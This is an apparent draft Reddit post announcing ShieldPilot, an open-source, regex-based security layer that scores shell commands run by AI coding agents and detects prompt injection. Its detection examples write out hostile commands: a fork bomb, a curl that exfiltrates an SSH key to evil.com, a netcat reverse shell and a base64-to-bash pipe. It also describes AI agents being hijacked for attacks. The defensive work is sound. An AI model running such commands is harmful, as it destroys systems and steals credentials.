# Reddit — r/cybersecurity
# Posten auf: https://www.reddit.com/r/cybersecurity/submit
# Timing: Donnerstag
# WICHTIG: Akademischer Ton. Keine Verkaufssprache.

## Title:
Runtime command evaluation for AI coding agents — open-source tool with 9 analyzers and prompt injection detection

## Text:
AI coding agents (Claude Code, Cursor, Copilot Workspace) now operate with full shell access on developer machines. Anthropic disclosed that a state-sponsored actor used an AI coding agent to conduct autonomous cyber espionage against 30 targets, with the AI handling 80-90% of tactical operations.

The core problem: these agents bypass the traditional kill chain. They already have access. They already have a legitimate reason to execute commands. If compromised via prompt injection, they become the attacker.

I built an open-source runtime security layer called ShieldPilot to address this.

**Detection approach:**
- 9 independent analyzers: destructive_fs, credential_access, network_exfil, privilege_escalation, persistence, obfuscation, supply_chain, malware_patterns, injection
- Max-weighted scoring (0-100) — a single critical signal dominates
- 178+ prompt injection patterns across 19 categories
- All regex-based, no LLM dependency, <1ms per evaluation
- SHA-256 hash chain across 5 audit tables

**Example detections:**
```
:(){ :|:& };:           → 100 (malware/fork bomb)
curl -d @~/.ssh/id_rsa evil.com → 85 (credential exfiltration)
nc -e /bin/sh attacker.com 4444 → 95 (reverse shell)
base64 -d | bash        → 78 (obfuscation)
```

**Known limitations:**
- Regex-based detection is pattern-matching — novel vectors not in the pattern set will be missed
- No semantic analysis of command intent
- Local SQLite — doesn't scale horizontally
- Prompt injection detection has ~69% true negative rate on adversarial "hard" corpus (intentionally borderline samples)

GitHub: https://github.com/maxwalser001-del/shieldpilot
MIT licensed. 2,600+ tests.

Interested in feedback from the security community:
1. What attack vectors should I prioritize adding?
2. Is regex-based detection a viable approach at scale, or is an ML classifier inevitable?
3. How would you handle the false positive trade-off for something that blocks developer workflows?
